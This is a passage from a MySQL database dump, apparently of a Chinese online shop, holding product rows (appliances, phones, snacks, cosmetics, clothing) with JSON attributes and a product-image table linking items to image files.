('B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', '美的吸尘器家用手持式超静音强力除螨地毯大功率小型迷你C3-L148B', '过年不打烊 热卖20万 限时疯抢领券下单 ', 0, '{\"\\u8bc1\\u4e66\\u7f16\\u53f7\":\"2014010708710614\",\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"Midea\\/\\u7f8e\\u7684 C3-L148B\",\"\\u529f\\u7387\":\"1200W\",\"\\u6700\\u5927\\u566a\\u97f3\":\"82dB\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u7ea2\\u8272\",\"\\u7ebf\\u957f\":\"5m\"}', '1486190888', '1580745600', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('B7391928-0D76-8E49-8911-CF772446F9C1', '荣欣堂红枣味太谷饼2100g特产早餐面包美食糕点零食批发小吃点心 ', '                    近7天生产 0防腐剂 中华老字号                 ', 0, '{\"\\u5382\\u5740\":\"\\u5c71\\u897f\\u7701\\u664b\\u4e2d\\u5e02\\u592a\\u8c37\\u53bf\\u767d\\u57ce\",\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u5e38\\u6e29\\u4fdd\\u5b58\"}', '1487260934', '1581868800', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '91F817CE-3262-34B0-AFD2-CFE545C115CB.png'),
('B763DD16-2E58-C493-0434-3952FA160C17', '绿豆面膜泥补水保湿控油去黑头男女收缩毛孔非清洁亮白祛痘印淡斑 ', '绿豆面膜泥补水保湿控油去黑头男女收缩毛孔非清洁亮白祛痘印淡斑 ', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"\\u4f0a\\u8bd7\\u5170\\u987f \\u7eff\\u8c46\\u6ce5\\u6d46\\u9762\\u819c\",\"\\u9762\\u819c\\u5206\\u7c7b\":\"\\u6c34\\u6d17\\u5f0f\",\"\\u9002\\u5408\\u80a4\\u8d28\":\"\\u4efb\\u4f55\\u80a4\\u8d28\",\"\\u5316\\u5986\\u54c1\\u51c0\\u542b\\u91cf\":\"120g\\/ml\",\"\\u529f\\u6548\":\"\\u8865\\u6c34 \\u4fdd\\u6e7f \\u63a7\\u6cb9 \\u6536\\u7f29\\u6bdb\\u5b54\",\"\\u4fdd\\u8d28\\u671f\":\":3\\u5e74\"}', '1486201364', '1612368000', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('BEC94BE7-D1A0-D643-6B2D-2FAA1F68B2FD', '德国brita碧然德即热净水吧家用厨房自来水过滤直饮滤水壶净水器', '过滤加热一体、一键启动、可调节出水量，100℃急速沸腾科技，烧开不到一分钟，烧开自动出水！活性炭将吸附氯、杀虫剂以及有机杂质，从而改善口感，消除异味和污染物质。离子交换树脂降低的引致石灰垢的硬度 物质，并减少铝、铜和铅等金属的含量。适当保留一些有益矿物质及微量元素。烧开直接饮用', 0, '{\"\\u51c0\\u6c34\\u5668\\u54c1\\u724c\":\"BRITA\\/\\u78a7\\u7136\\u5fb7\",\"\\u578b\\u53f7\":\"\\u5373\\u70ed\\u51c0\\u6c34\\u5427\",\"\\u989d\\u5b9a\\u51fa\\u6c34\\u91cf\":\"60L\\/h\",\"\\u5de5\\u4f5c\\u539f\\u7406\":\"\\u6d3b\\u6027\\u70ad\",\"\\u6ee4\\u82af\":\"\\u6d3b\\u6027\\u70ad+\\u8d85\\u6ee4\"}', '1486197940', '1549209600', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('C3E30939-86EB-730F-900E-17B582155781', 'Huawei/华为 P9全网通4G智能手机', '当天发，下单即送：专用智能皮套+纳米防爆膜+转接头+原装保护壳+懒人支架+保修三年+顺丰包邮。5.2英寸，双1200万+800万莱卡摄像头，八核，麒麟955，指纹解锁，3000毫安电池。标配（3G+32G）高配(4G+64G）；P9 PIUS是5.5英寸【注意：主图礼品以套餐为准，各套餐礼品均不同】', 0, '{\"\\u54c1\\u724c\":\"Huawei\\/\\u534e\\u4e3a\",\"\\u5206\\u8fa8\\u7387\":\"1920x1080\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"\\u53cc1200\\u4e07\",\"\\u534e\\u4e3a\\u578b\\u53f7\":\"P9\\u5168\\u7f51\\u901a\"}', '1484983330', '1610640000', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('D2BCDC64-0970-3775-3193-6D870A490A84', '现货 2016.9月 日本FANCL新版保湿洁面粉50g 泡沫深层清洁 ', '现货 2016.9月 日本FANCL新版保湿洁面粉50g 泡沫深层清洁 ', 0, '{\"\\u89c4\\u683c\\u7c7b\\u578b\":\": Fancl\\/\\u65e0\\u6dfb\\u52a0\",\" \\u4fdd\\u8d28\\u671f\":\": \\u4e00\\u5e74\",\"\\u529f\\u6548:\":\"\\u4fdd\\u6e7f \\u63a7\\u6cb9 \\u6536\\u7f29\\u6bdb\\u5b54  \",\"\\u662f\\u5426\\u4e3a\\u7279\\u6b8a\\u7528\\u9014\\u5316\\u5986\\u54c1:  \":\" \\u5426\",\"\\u4ea7\\u5730:\":\"\\u65e5\\u672c\",\"fancl\\u5355\\u54c1: \":\"\\u4fdd\\u6e7f\\u6d01\\u9762\\u7c89   \",\" \\u54c1\\u724c:\":\" Fancl\\/\\u65e0\\u6dfb\\u52a0     \",\"\":\"\"}', '1484984046', '1420732800', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('D5CD3549-48F1-F39A-F547-EF40372ECC5D', 'RC相纸5寸6寸7寸A4高光防水4R照片纸260g磨砂绸绒面彩色喷墨打印', 'RC相纸5寸6寸7寸A4高光防水4R照片纸260g磨砂绸绒面彩色喷墨打印 ', 0, '{\"     \\u989c\\u8272\\u5206\\u7c7b\":\"6\\u5bf8 260\\u514bRC\\u6cb9\\u753b\\u5e03\\u9762 100\",\"\\u5e45\\u9762:\":\"4r\",\"\\u662f\\u5426\\u5377\\u7b52\\u578b\":\"\\u5426\",\"\\u54c1\\u724c\":\"\\u529b\\u6b66\"}', '1484984199', '1580400000', 'FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('D678064A-D80E-EFA2-4A01-873583FF3E9B', '乐焙芝家用大容量电烤箱 定时温控烘焙蛋糕披萨 多功能烤箱 30L ', ' 乐焙芝家用大容量电烤箱 定时温控烘焙蛋糕披萨 多功能烤箱 30L  新品上架', 0, '{\"\\u529f\\u7387\":\"1201W(\\u542b)-1500W(\\u542b)\",\"\\u52a0\\u70ed\\u7ba1\\u6570\\u91cf\":\"4\\u4e2a\",\"\\u53d1\\u70ed\\u7ba1\\u6750\\u8d28\":\"\\u4e0d\\u9508\\u94a2\",\"\\u578b\\u53f7\":\"TY-281A\",\"\\u5bb9\\u91cf\":\"30L\",\"\\u667a\\u80fd\\u7c7b\\u578b\":\"\\u673a\\u68b0\\u5f0f\",\"\\u6e29\\u63a7\\u65b9\\u5f0f\":\"\\u4e0a\\u4e0b\\u7ba1\\u72ec\\u7acb\\u63a7\\u6e29\",\"\\u5bb9\\u91cf\\u8303\\u56f4\":\"21L(\\u542b)-30L(\\u542b)\"}', '1486198765', '1612368000', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('D708E35B-239A-0E3B-3988-B7EA5C3A3066', 'SW床垫 进口乳胶床垫1.5 1.8m弹簧椰棕垫软硬定做席梦思床垫 ', 'SW床垫', 0, '{\"\\u4e73\\u80f6\\u539a\\u5ea6\":\"20mm\",\"\\u5e8a\\u57ab\\u8f6f\\u786c\\u5ea6\":\" \\u8f6f\\u786c\\u4e24\\u7528\",\"\\u6bdb\\u91cd\":\"55\",\"\\u54c1\\u724cv\":\"Sweetnight\",\"\\u6d77\\u7ef5\\u7c7b\\u578b\":\"\\u666e\\u901a\\u6d77\\u7ef5\",\"\\u9762\\u6599\\u5206\\u7c7b\":\"\\u9488\\u7ec7\\u9762\\u6599\"}', '1484576363', '1486742400', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', '【天天特价】分期免息OPPO R9S拍照智能手机 oppor9s r9 r9splus ', '分期免息，购机领大礼', 0, '{\"\\u54c1\\u724c\":\"OPPO\",\"OPPO\\u578b\\u53f7\":\"R9S\",\"\\u5206\\u8fa8\\u7387\":\"1920*1080\",\"\\u7f51\\u7edc\\u7c7b\\u578b\":\"4G\\u5168\\u7f51\\u901a\",\"\\u7f51\\u7edc\\u6a21\\u5f0f\":\"\\u53cc\\u5361\\u53cc\\u5f85\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\"1600\\u4e07\",\"\\u8fd0\\u884c\\u5185\\u5b58RAM\":\"4GB\",\"\\u5b58\\u50a8\\u5bb9\\u91cf\":\"64GB\"}', '1486186843', '1612368000', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('E1A02C6D-C1C6-A748-983D-A236648BDCD4', '现货 2016.8月30日产 日本专柜FANCL卸妆油120ml 净化修护卸妆液 ', '现货 2016.8月30日产 日本专柜FANCL卸妆油120ml 净化修护卸妆液 ', 0, '{\"\\u539f\\u6599\\u6210\\u5206\":\"\\u725b\\u5976 \\u67e0\\u6aac\\u9a6c\\u97ad\\u8349 \\u6708\\u89c1\\u8349 \\u5176\",\"\\u9002\\u5408\\u80a4\\u8d28\":\" \\u4efb\\u4f55\\u80a4\\u8d28\",\"\\u54c1\\u724c\":\"Fancl\\/\\u65e0\\u6dfb\\u52a0\",\"\\u4ea7\\u5730\":\"\\u65e5\\u672c\"}', '1484570726', '1486742400', 'F994FC1C-7A5F-16A6-70E4-1672633B13D6', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('EE5D2613-2760-F18C-A447-B8E744FF509D', '原色开心果自然原色无漂白500g开口原味坚果零食本色干果炒货 ', '                    原色开心果自然原色无漂白500g开口原味坚果零食本色干果炒货                ', 0, '{\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u9634\\u51c9\\u5e72\\u71e5\",\"\\u51c0\\u542b\\u91cf\":\"500g\",\"\\u98df\\u54c1\\u53e3\\u5473\":\"\\u76d0\\u7117\\u53e3\\u5473\",\"\\u54c1\\u724c\":\"\\u797a\\u5b9d\",\"\\u4fdd\\u8d28\\u671f:\":\"360\",\"\\u98df\\u54c1\\u6dfb\\u52a0\\u5242\":\"\\u67e0\\u6aac\\u9178\"}', '1484983798', '1585843200', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('F396C933-04BC-E46D-012F-AE67F7DD37EE', '清风抽纸原木纯品3层面巾纸婴儿家用纸巾整箱家庭装 ', '清风抽纸原木纯品3层面巾纸婴儿家用纸巾整箱家庭装 ', 0, '{\"\\u54c1\\u724c\":\"\\u6e05\\u98ce\",\"\\u662f\\u5426\\u91cf\\u8d29\\u88c5\":\"\\u5426\",\"\\u9762\\u5dfe\\u7eb8\\u79cd\\u7c7b\":\"\\u8f6f\\u5305\\u88c5\\u9762\\u5dfe\\u7eb8\",\"\\u539f\\u6750\\u6599\\u6210\\u5206\":\"\\u539f\\u751f\\u6d46\"}', '1484575927', '1486742400', 'D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('F51D327E-3EFE-0E64-BA0A-E122DB83F189', '新品【百草味-蛋黄酥120g】手工糕点蛋黄酥小包装 零食小吃美食 ', '	新品【百草味-蛋黄酥120g】手工糕点蛋黄酥小包装 零食小吃美食  300款零食 一站购 6.9元起开抢 ', 0, '{\"\\u751f\\u4ea7\\u8bb8\\u53ef\\u8bc1\\u7f16\\u53f7\":\"SC10133052100455\",\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u5e38\\u6e29\\u5bc6\\u5c01\\u5b58\\u653e\\uff0c\\u907f\\u514d\\u9ad8\\u6e29\",\"\\u4fdd\\u8d28\\u671f\":\"60\\u5929\",\"\\u98df\\u54c1\\u6dfb\\u52a0\\u5242\":\"\\u89c1\\u5305\\u88c5\"}', '1486187737', '1549209600', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('F72A0711-12B1-2360-6A79-023E0A6FB6BF', '正山小种茶叶 红茶茶叶 武夷山正山小种茶叶散装600克 五虎红茶', '                    正山小种茶叶 红茶茶叶 武夷山正山小种茶叶散装600克 五虎红茶                 ', 0, '{\"\\u4ea7\\u54c1\\u540d\\u79f0\":\"\\u4e94\\u864e 150\\u514b*4 \\u6b63\\u5c71\\u5c0f\\u79cd\",\"\\u51c0\\u542b\\u91cf\":\"600g\",\"\\u5305\\u88c5\\u65b9\\u5f0f:\":\"\\u5305\\u88c5\"}', '1484570266', '1486742400', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('F7B2B9AF-0CE7-BCFA-194D-842C08DEA654', '正品 Meitu/美图M6 秀秀美颜移动智能自拍神器美图手机4G全网通S', '正品 Meitu/美图M6 秀秀美颜移动智能自拍神器美图手机4G全网通S', 0, '{\"CPU\\u578b\\u53f7\":\"MT6755\",\"\\u4e0a\\u5e02\\u65f6\\u95f4\":\"2016\\u5e74\",\"\\u54c1\\u724c\":\"Meitu\\/\\u7f8e\\u56fe\",\"\\u540e\\u7f6e\\u6444\\u50cf\\u5934\":\" 2100\\u4e07\",\"\\u7f51\\u7edc\\u7c7b\\u578b\":\"4G\\u5168\\u7f51\\u901a\"}', '1484982962', '1489593600', '035979B6-A44A-32EA-646F-28A51C607A73', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('F7BC08D4-A15A-0784-3456-04EE6D29C689', '醉牙尖五香藤椒味脱骨鸭掌去骨鸭爪_花椒味卤味美食小吃独立包装 ', '通威太丰鸭掌 品牌原料 真空独立包装 方便携带 ', 0, '{\"\\u751f\\u4ea7\\u8bb8\\u53ef\\u8bc1\\u7f16\\u53f7\":\"QS5101 0401 0044\",\"\\u50a8\\u85cf\\u65b9\\u6cd5\":\"\\u5e38\\u6e29\\u4fdd\\u5b58\\uff0c\\u51b7\\u85cf\\u66f4\\u4f73\",\"\\u4fdd\\u8d28\\u671f\":\"90\\u5929\",\"\\u98df\\u54c1\\u6dfb\\u52a0\\u5242\":\"\\u8c37\\u6c28\\u9178\\u94a0\\uff0c\\u4e59\\u57fa\\u9ea6\\u82bd\\u915a\",\"\\u662f\\u5426\\u542b\\u7cd6\":\"\\u542b\\u7cd6\"}', '1486188122', '1549209600', '25D26743-4E79-4489-AB85-C6B773BA6588', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('FB498C2A-0CB1-403B-A836-D602ABC96AB8', '秋冬季健身服男套装健身房三四五件套运动透气速干长袖跑步紧身衣', '秋冬季健身服男套装健身房三四五件套运动透气速干长袖跑步紧身衣', 0, '{\"\\u4e0a\\u88c5\\u6b3e\\u5f0f\":\"\\u957f\\u8896\",\"\\u529f\\u80fd\":\"\\u5438\\u6e7f\\u6392\\u6c57 \\u901f\\u5e72 \\u900f\\u6c14 \\u8d85\\u5f3a\\u5f39\\u6027\",\"\\u5c3a\\u7801\":\"M L XL XXL\",\"\\u4e0b\\u88c5\\u88e4\\u957f\":\"\\u957f\\u88e4\"}', '1484576146', '1486742400', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC', '2017春装新款女韩版时尚鱼尾红裙子小香风明星同款蕾丝红色连衣裙 ', '连衣裙', 0, '{\"\\u8896\\u578b\":\"\\u5e38\\u89c4\",\"\\u6d41\\u884c\\u5143\\u7d20\":\"\\u62fc\\u63a5 \\u62c9\\u94fe \\u857e\\u4e1d\",\"\\u8863\\u95e8\\u895f\":\"\\u5957\\u5934\",\"\\u56fe\\u6848\":\"\\u7eaf\\u8272\",\"\\u88d9\\u957f\":\"\\u4e2d\\u88d9\",\"\\u8170\\u578b:\":\"\\u9ad8\\u8170\"}', '1484577839', '1486742400', '57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png'),
('FF815C07-E3C4-C632-F29C-42FE92C32AF9', '充电式便携榨汁杯电动迷你果汁杯玻璃料理杯多功能小型榨汁机家用', '充电式便携榨汁杯电动迷你果汁杯玻璃料理杯多功能小型榨汁机家用', 0, '{\"\\u4e00\\u6b21\\u6027\\u6700\\u5927\\u51fa\\u6c41\\u91cf\":\"400ml\\u4ee5\\u4e0b\",\"\\u69a8\\u6c41\\u673a\\u9644\\u52a0\\u529f\\u80fd\":\"\\u51b0 \\u5e72\\u78e8 \\u6405\\u62cc \\u548c\\u9762 \\u6253\",\"\\u679c\\u8089\\u6e23\\u6ed3\\u76d2\\u5bb9\\u91cf\":\"500ml\\u4ee5\\u4e0b\\uff08\\u542b500m\",\"\\u54c1\\u724c\":\"\\u897f\\u5e03\\u6717\",\"\\u989c\\u8272\\u5206\\u7c7b\":\"\\u5ae9\\u7c89\\u8272 \\u679c\\u7eff\\u8272 \\u67e0\\u6aac\\u9ec4 \",\"\\u529f\\u7387\":\"150W\"}', '1484984403', '1611849600', 'B619C389-BE62-40B1-0F25-4B5E60B356D2', '0', 1, '1D7E477D-4EEA-2490-AB16-CA5A7423144D.png');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_commodity_images`
--

CREATE TABLE `shopp_commodity_images` (
  `id` char(36) NOT NULL,
  `commodity_id` char(36) NOT NULL,
  `image` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_commodity_images`
--

INSERT INTO `shopp_commodity_images` (`id`, `commodity_id`, `image`) VALUES
('00AE8CD9-30A3-23EC-CC1E-4400B38CB68F', '3BAADFC7-A792-40D4-6BF3-978F5F868196', 'A9EB0DA2-94A7-1CD1-3A85-F3FB3F6816B0.png'),
('010EA10D-C8A3-DACD-80B1-E7503FC45421', '63D87121-EC06-A576-DE0F-386A49F4243B', 'DEC44F21-0A0E-A02F-41B3-4FBDA4D23BC7.jpg'),
('02B0D106-9139-0BF9-7EF1-12B48BE43E19', '2D089988-6636-BF15-676F-15A6AED0433F', '23411573-FF7B-A732-2F2D-7CFEC60B9109.png'),
('031079F7-1308-1180-A3D9-504B0B64D018', '8C5CBC3B-C3A0-F078-2DC1-DD276D203A5E', '809FA808-4676-EC6A-66CA-7728D782977E.png'),
('043D01FA-3E52-D8C8-BFC8-62FF7AAD4019', '47D002AB-DFA4-11CF-52FB-398122144EF1', '91BA1E29-61B8-1429-794B-120B85D4BCB8.png'),
('045C0DB0-E049-0AD3-6C63-387315E0B704', '3BAADFC7-A792-40D4-6BF3-978F5F868196', '2CD36141-5F28-07FB-46BD-238B042CC70C.png'),
('04DD0F41-D172-FE71-3715-524E36125CBD', 'AE6D4A9D-7257-836A-2687-8EE3B440594E', '235F5B9E-5EFF-11B5-988A-CCF7C72FCBB4.png'),
('089B386A-8EA5-C043-DF80-47753F9CE3D4', '63D87121-EC06-A576-DE0F-386A49F4243B', 'CD735AF8-AE20-3C5E-3AA3-AD234F432034.png'),
('0924DCA9-D908-C76B-3E83-52B7E2648D21', '00D84306-7B0D-F027-28E4-09D70124D2CB', '3DFC2305-D08D-E885-1895-6FFF9BA13E05.png'),
('0BF0872F-1938-4913-F73B-73B9448914C5', 'B45A2DB7-6698-C70C-1AD5-94E3E5E7E6A1', '5C5BDFF5-0994-E920-5329-6C442D94090E.png'),
('0C0AFBEA-FEF3-FD5E-94E1-A0826B4DB746', '26C82144-FCFB-AA3A-150D-2640FFF623F2', '0564D53A-BCD6-7435-6EE7-0D247C0F3BC5.png'),
('0C1ADBEB-A0B5-9A8C-4F9A-2C24E4835696', 'BEC94BE7-D1A0-D643-6B2D-2FAA1F68B2FD', '01F38FCE-573C-B1C8-6149-1280BE0C03EC.png'),
('0D5D1A74-FCA9-334A-F3AE-25B28C4E2C27', '72387161-B237-7FC1-3FB3-E78C23533C5C', 'AC310C10-B63F-9224-48BA-7D3BF667C732.png'),
('0F969678-3203-FC8B-8412-DD259EB3F634', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D', '5A41C99F-E0CD-41A9-68D1-763A23FC096A.png'),
('10E18D83-216D-B2DF-E103-E09E2753BDD0', '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E', '46090D57-4984-3269-7F54-49A0E7FECCD1.png'),
('12934A0A-AD7F-985C-0B6C-F321A916B5E6', 'B763DD16-2E58-C493-0434-3952FA160C17', '81B94721-29D4-4E0B-D149-B2C8BED3DE35.png'),
('1392DEEA-1C96-1926-ED21-A07BF51CFC23', 'F396C933-04BC-E46D-012F-AE67F7DD37EE', 'B10C4D0E-DC6B-E713-601B-295AD39E3082.png'),
('144B599F-9F4A-83A8-B3C1-5D9C30668018', '753C793E-1F5D-1DC7-4103-A23D23E016C2', 'B1BCB576-36D4-8F6E-3114-206FD038E8B8.png'),
('145CF272-25BC-51ED-1C34-BA84E35E8B40', '26C82144-FCFB-AA3A-150D-2640FFF623F2', '48E6E0F4-A946-4D2C-0B3C-7B987D1B6F53.png'),
('15667DF7-9FAC-22DF-03AD-00E467EDFEE3', '96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7', 'D4C56046-57DD-C8E0-E3BA-57FAF9B6FBC7.png'),
('15ABACA8-497B-7722-8D9E-333B3C9DA8E1', 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', '850B36B7-2D1F-857A-73E3-82B3282E01BC.png'),
('164A9527-7903-60AA-E1B1-EDA995CD73AB', '92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9', 'AD4E4503-8FE4-3539-0334-5A0C01AE07EA.png'),
('18AA7994-65A0-6228-E0BC-9B291626E49C', 'BEC94BE7-D1A0-D643-6B2D-2FAA1F68B2FD', '7503B429-C953-46D1-AE01-74BAF40835C4.png'),
('18B384BF-252C-055C-867B-0A50CA26BC57', 'D2BCDC64-0970-3775-3193-6D870A490A84', 'B24B12DA-8736-F61D-551C-88F7C7BA3FD7.png'),
('1997BE04-425C-9751-DD36-74705AEF8DAE', '6275F89C-A2A1-8B7B-A259-94926A84C442', 'B692FC77-20A6-3C5F-2D04-A37A31EC0BCF.png'),
('1A033E83-F48D-04BC-D60A-AA33E518D647', '0F0CD553-FCD9-655A-228F-1F57509DD264', '7A7FE13E-BEC4-3BFD-C49D-239B7651580F.png'),
('1A5E94EB-FD10-2524-3616-8A3EFDF0047B', '92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9', '090B4D20-D5E7-2A83-F46D-273CA588502B.png'),
('1B5D4B9C-0573-3AD9-ECEC-53470C1A9FA8', '26C82144-FCFB-AA3A-150D-2640FFF623F2', 'FECF77AC-68AA-DEF5-F18C-A93420E8DBBC.png'),
('1E23B383-99C5-739E-8F16-DBD0211176E4', 'F7BC08D4-A15A-0784-3456-04EE6D29C689', 'A59BD828-D778-4D4D-429D-6BFB62019F48.png'),
('1F37B464-4E65-342A-48C8-2E777DC143BF', '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3', '63A5FF97-4FAE-2B5E-F14D-EFDC3A62812C.png'),
('1FE3F7CE-5594-D0DF-4D07-72CA5B82A6B4', '63D87121-EC06-A576-DE0F-386A49F4243B', 'D7C6B28E-02A5-DB11-7284-639B888987AB.png'),
('20941A17-D45B-17BC-5AFB-C9FA2BC5386B', '900AA834-8BF4-9826-3239-01487EF71BED', '34908851-BA41-5689-7AE7-797CCBF7D7DB.png'),
('23AE7030-55CB-6A10-1197-6F9A38F6D5DE', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', '52C5EBB9-FA93-56B9-C760-E4878E2FD85C.png'),
('23D612FC-375D-7425-2485-54DDA2124BE3', 'C3E30939-86EB-730F-900E-17B582155781', '69126D76-B2B3-7B3C-621B-B9F1FB582B25.png'),
('2428A325-CED3-CC23-70A4-CED147F3E515', '433DA60D-5065-1301-48B8-76D1BB06CDF0', '8B6D484F-FE4B-F3FB-C354-4A384FAD4A68.png'),
('24FB3E8D-1453-8C82-C747-F0DB2A39BDF8', '8AF4E387-5D09-9D99-DBC7-A22396BE2E51', 'BF8B2D1D-333E-3B0D-7BF3-A987A93C8A00.png'),
('27D0B112-B400-652A-4B2B-7053126F6D8C', '00D84306-7B0D-F027-28E4-09D70124D2CB', 'A1996EAF-1915-A404-9ACC-BEF176301DEF.png'),
('28D0E40F-CF7B-1785-B464-17A38349412E', '753C793E-1F5D-1DC7-4103-A23D23E016C2', '2CDE72D3-F3BD-886F-E70A-8F8E8C419D86.png'),
('28F9FADC-4EAB-A587-A934-66EE3FC931DA', 'B45A2DB7-6698-C70C-1AD5-94E3E5E7E6A1', 'F8FDC530-B0A7-D38E-F728-32FA3E6E5960.png'),
('2A8D0474-F326-DD78-CBF8-10A7E0E193D5', '511676D4-6E5E-A943-02D2-23838D8A4B2A', '948CDB85-0B96-D5ED-90EE-362FF68685B0.png'),
('2BC978EF-DF92-BA80-3DD8-F738397A7A28', 'C3E30939-86EB-730F-900E-17B582155781', 'E0D075A6-ECFF-3F54-71EB-9A66BDAA2570.png'),
('2C2A28C8-49B8-BB5F-77DB-BB0FBB79A18C', '22B10E64-2792-9976-E179-2481FBD15CB5', 'C75D642C-41E4-B8AC-C161-C1233D990D15.png'),
('2C6A3859-23F6-45AB-5176-2EC8A73B266F', '179149C6-2255-FAA2-F9F8-CA6608080FAA', '4CE10BB9-E942-5648-12C6-7B4601205A90.png'),
('2C863D06-CB5C-131F-6B8B-59BFEAADF27F', '21B3CE06-EBCB-ECA1-E311-88D1C759C156', 'E8A37109-AFE6-A91A-7493-014F1AE6D124.png'),
('2D8F749C-245A-C515-7AB1-596B78975E20', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', '6CABC0BC-87F0-6C1F-7B1F-951FAE9F027B.png'),
('2F04B13C-FF65-4498-8388-E1368BE0E4A1', 'FF815C07-E3C4-C632-F29C-42FE92C32AF9', 'A25EE1C4-8BDC-8970-C36C-E7B3F92AB82E.png'),
('2F0EA931-BCAA-E635-0E3F-2587465D4C3E', 'F7B2B9AF-0CE7-BCFA-194D-842C08DEA654', 'CA7FBEEC-9C3A-0F9A-F1DE-31AFFE731670.png'),
('30559F35-FBF2-007D-BBC3-61976BF530EE', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE', '5BE7ED92-B1E1-8CE0-B92F-FC76B96958D9.png'),
('3288E1BE-6DFF-3712-EC7C-406C53B3D370', 'F72A0711-12B1-2360-6A79-023E0A6FB6BF', '46197659-86BD-5714-0C2B-CEDE85DE5B41.png'),
('340C2B2E-5214-1C4B-8C2F-AC42B00A6D7C', '22B10E64-2792-9976-E179-2481FBD15CB5', '66B366FE-CADE-B854-5EF0-6E2C240732F6.png'),
('362D1CD8-55B1-6BFD-BE69-71984E31599F', '8C5CBC3B-C3A0-F078-2DC1-DD276D203A5E', '2A61B114-7F8D-346F-DC1A-FE1B1C55C8A4.png'),
('39842715-6EB9-5D42-8079-CD1D078BC6C4', '47D002AB-DFA4-11CF-52FB-398122144EF1', '332F289D-C88A-BC0A-A459-3A78C29848F1.png'),
('3B41DE1D-48B2-FA19-2B99-10E7A957CF22', '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', 'CF85986E-89DF-6017-C958-217D262E685D.png'),
('3F53DCF9-A0C8-123E-52E0-A34E0257EA92', 'FF815C07-E3C4-C632-F29C-42FE92C32AF9', 'B4216472-9070-32EE-F833-C6807B97C17A.png'),
('435EEAF5-2AB9-64EB-57C9-794551A71153', '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE', '340ABD1C-58C6-1082-EBB9-29F88B8D122D.png'),
('43C3C1CD-050B-4EFD-3AE6-937684AAC3A5', '47D002AB-DFA4-11CF-52FB-398122144EF1', '214C8BC5-6D12-E1C6-5AAC-9D83171AA85F.png'),
('43FD15FE-3419-FEDB-5347-ECE24F0CAFCA', '2D089988-6636-BF15-676F-15A6AED0433F', '6DF8D5B2-81CB-1E08-822D-968B1FB61778.png'),
('448D5193-E176-BE27-2C94-2A4EF5A25361', '00D84306-7B0D-F027-28E4-09D70124D2CB', '3075CA8D-C9E4-EDD1-4610-F262E3E86ECF.png'),
('45F3D285-124F-63AF-B128-5ADBB4692750', 'E1A02C6D-C1C6-A748-983D-A236648BDCD4', '238A1288-FFBC-5FD4-A0DE-B53F79BA48BD.png'),
('461A2944-7E38-B809-4386-5A8E1DF1C54C', 'D678064A-D80E-EFA2-4A01-873583FF3E9B', '4042AB5A-85B8-F240-358A-498D65B8B369.png'),
('48AEC2D0-9DFE-9A4C-277D-A09693DD3542', 'FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC', '5B82284D-D583-9E48-BD71-2DB7F9DCF779.png'),
('48F200D0-CDF2-8267-F997-B8D3D9DC695F', 'D5CD3549-48F1-F39A-F547-EF40372ECC5D', '06CBE955-8C6F-C711-2626-60359FBF0D94.png'),
